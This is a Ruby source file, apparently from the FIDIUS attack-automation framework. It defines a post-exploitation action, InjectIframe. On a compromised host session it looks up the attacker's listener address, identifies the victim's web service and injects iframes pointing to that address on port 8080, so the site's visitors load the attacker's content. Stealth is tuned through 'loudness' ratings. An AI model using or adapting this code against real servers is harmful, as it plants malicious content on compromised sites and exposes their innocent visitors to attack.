module FIDIUS
  module Action
    module PostExploit

      autoload :Webserver,         'fidius/action/postexploit/webserver'

      class InjectIframe
        include FIDIUS::Action::PostExploit::PostExploit

        def get_loudness_host
          10
        end

        def get_loudness_net
          0
        end

        def autorun
          false
        end

        def id
          "injectIframe"
        end

        def run session, host
          lhost = FIDIUS::Action::Session.get_lhost session
          puts "LHOST FOR WEBINJECTION: --------------- : #{lhost}"
          webserver_iframe = FIDIUS::Action::PostExploit::Webserver::IFrameInjection.new session, "http://#{lhost}:8080"
          webserver_iframe.identify_webservice
          webserver_iframe.inject_iframes
          # webserver_iframe.establish_port_fwd lhost # This does not work for now
        end

      end #class InjectIframe
    end #module PostExploit
  end #module Action
end #module FIDIUS
